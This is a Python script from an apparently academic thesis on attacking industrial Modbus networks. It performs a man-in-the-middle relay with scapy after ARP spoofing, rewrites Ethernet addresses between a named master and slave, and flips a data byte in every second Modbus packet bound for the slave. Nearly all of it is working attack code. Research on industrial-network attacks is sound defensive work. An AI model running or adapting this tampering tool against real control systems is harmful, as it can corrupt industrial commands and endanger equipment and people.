# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: mima.py
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description: 

from scapy.all import *

# we will need to arpspoof first 

# Define the network interfaces to listen on and forward packets to
listen_interface = "eno2"

# modify each 10nth packet 
MODIFY_NTH_PACKET = 2

#
real_master_ip = '192.168.88.250' # 1C:69:7A:08:86:1A
slave_ip       = '192.168.88.252' # b8:27:eb:1e:08:59
MIM_ip         = '192.168.88.199' # 8c:04:ba:08:73:03

real_master_mac = '1c:69:7a:08:86:1a' # 1C:69:7A:08:86:1A
slave_mac       = 'b8:27:eb:1e:08:59' # b8:27:eb:1e:08:59
MIM_mac         = '8c:04:ba:08:73:03' # 8c:04:ba:08:73:03

packet_num=0

# Define the function that will be called for each received packet
def handle_packet(packet):
    # count packets 
    global packet_num

    # not an ethernet packet 
    if not packet.haslayer(Ether):
        return

    # filter only modbus packet (tcp && (dst.port == 502 || src.port == 502 ))
    if not (packet.haslayer(TCP) and (packet[TCP].sport == 502 or packet[TCP].dport == 502)):
        return
    
    # packets that are going throught MIM
    if packet[Ether].dst == MIM_mac:
        ## these destination is master 
        if packet[Ether].src == slave_mac:
            packet = packet_for_master(packet)
        ## these destination is .252 
        elif packet[Ether].src == real_master_mac:
            packet = packet_for_slave(packet)
        else:
           return
   
    # modify each nth packet that is going to slave 
    if packet[Ether].dst == slave_mac: 
        packet_num += 1
        if packet_num % MODIFY_NTH_PACKET == 0:
            packet = change_packet(packet)

    # send packet 
    sendp(packet, iface=listen_interface)

## Change data part of modbus packet 
def change_packet(packet):
    print("change")
    print(packet.show())
    if len(packet[TCP].payload) != 12:
        return packet 

    print(len(packet[TCP].payload))
    tcp_payload = packet[TCP].payload.load
    print(tcp_payload.hex())
    
    ## 11-12 byte is data 
    
    # Invert the bits of the 11th byte
    byte_index = 10 # 0-based indexing
    inverted_byte = bytes([~tcp_payload[byte_index] & 0xff])
    tcp_payload = tcp_payload[:byte_index] + inverted_byte + tcp_payload[byte_index+1:]
    
    # Print the modified payload
    print(tcp_payload.hex())
    
    # Update the packet with the modified payload
    packet[TCP].payload.load = bytes(tcp_payload)
   
    # Recalculate TCP checksum
    del packet[TCP].chksum
    packet[TCP].chksum_relaxed = 0 

    return packet 


# Prepare packet that has master destination 
def packet_for_master(packet):
    
    print("a")
    
    # change dst mac address to the real one 
    packet[Ether].dst = real_master_mac
    packet[Ether].src = MIM_mac 
    
    return packet 

# prepare packet that has slave destination 
def packet_for_slave(packet):
    
    print("hh")
    
    # change dst mac address to the real one 
    packet[Ether].dst = slave_mac
    packet[Ether].src = MIM_mac 
    
    return packet 

# Start sniffing packets on the listen interface and call the handle_packet function for each packet received
sniff(iface=listen_interface, prn=handle_packet)



    
